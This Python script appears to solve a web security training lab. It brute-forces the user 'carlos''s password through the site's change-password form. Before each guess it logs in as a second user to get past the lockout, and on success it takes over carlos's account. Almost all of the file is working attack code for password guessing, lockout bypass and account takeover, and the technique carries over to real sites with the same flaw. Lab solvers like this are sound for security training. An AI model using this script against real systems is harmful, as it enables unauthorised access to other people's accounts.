import requests
import time
from colorama import Fore

LAB_NAME = "Password brute-force via password change"
NEW_CARLOS_PASSWORD = "mystic_mido"
SCRIPT_START_TIME = time.time()

def run(url, payload=None, proxies=None):
    url = url.rstrip('/')
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Read password list\n2. Brute force carlos password via password change functionality and change his password (login as wiener before every try to bypass blocking)\n3. Wait 1 minute to bypass blocking\n4.Login as carlos with the new password\n""")

    print("[1] Reading password list.. ", end="", flush=True)
    password_list = read_password_list("passwords.txt")
    print(Fore.GREEN + "OK")

    print(Fore.WHITE + "[2] Brute forcing carlos password..")
    is_found = brute_force_password(url, password_list, proxies)

    if is_found:
        print(Fore.WHITE + "[3] Waiting 1 minute to bypass blocking.. ", end="", flush=True)
        time.sleep(60)
        print(Fore.GREEN + "OK")

        print(Fore.WHITE + "[4] Logging in as carlos with the new password.. ", end="", flush=True)
        login_resp = login(url, "carlos", NEW_CARLOS_PASSWORD, proxies)
        session = login_resp.cookies.get("session")
        cookies = { "session": session }

        profile_resp = requests.get(f"{url}/my-account", cookies=cookies, proxies=proxies, verify=False, allow_redirects=False)
        if profile_resp.status_code == 200:
            print(Fore.GREEN + "OK")
            print_finish_message()
            return True
        else:
            print(Fore.RED + "[!] Login as carlos failed.")
    else:
        print(Fore.RED + "[!] No valid password was found.")


def read_password_list(path):
    try:
        return open(path, 'rt').read().splitlines()
    except Exception as e:
        print(Fore.RED + f"⦗!⦘ Failed to open {path}: {e}")
        exit(1)


def brute_force_password(url, password_list, proxies=None):
    for i, password in enumerate(password_list):
        login_resp = login(url, "wiener", "peter", proxies)
        session = login_resp.cookies.get("session")

        if not session:
            print(Fore.RED + "\n[!] Failed to get session as wiener.")
            continue

        change_resp = change_carlos_password(url, session, password, proxies)

        if change_resp.status_code == 200:
            print_correct_password(password)
            return True
        else:
            print_progress(i, len(password_list), password)

    return False


def login(url, username, password, proxies=None):
    data = { "username": username, "password": password }
    try:
        return requests.post(f"{url}/login", data=data, allow_redirects=False, proxies=proxies, verify=False)
    except Exception as e:
        print(Fore.RED + f"\n[!] Login failed: {e}")


def change_carlos_password(url, session, current_password, proxies=None):
    data = {
        "username": "carlos",
        "current-password": current_password,
        "new-password-1": NEW_CARLOS_PASSWORD,
        "new-password-2": NEW_CARLOS_PASSWORD
    }
    cookies = { "session": session }

    try:
        return requests.post(f"{url}/my-account/change-password", data=data, cookies=cookies, allow_redirects=False, proxies=proxies, verify=False)
    except Exception as e:
        print(Fore.RED + f"\n[!] Change password failed: {e}")
        exit(1)


def print_progress(counter, total, password):
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + f"Elapsed: {elapsed}s || Trying ({counter+1}/{total}): " + Fore.BLUE + f"{password:50}", end='\r', flush=True)


def print_correct_password(password):
    print(Fore.WHITE + f"\nCorrect password: " + Fore.GREEN + password)
    print(Fore.WHITE + f"Password changed to: " + Fore.GREEN + NEW_CARLOS_PASSWORD)


def print_finish_message():
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + f"Finished in: {Fore.YELLOW + str(elapsed)} seconds")
    print(Fore.WHITE + f"The lab should be marked as " + Fore.GREEN + "solved")

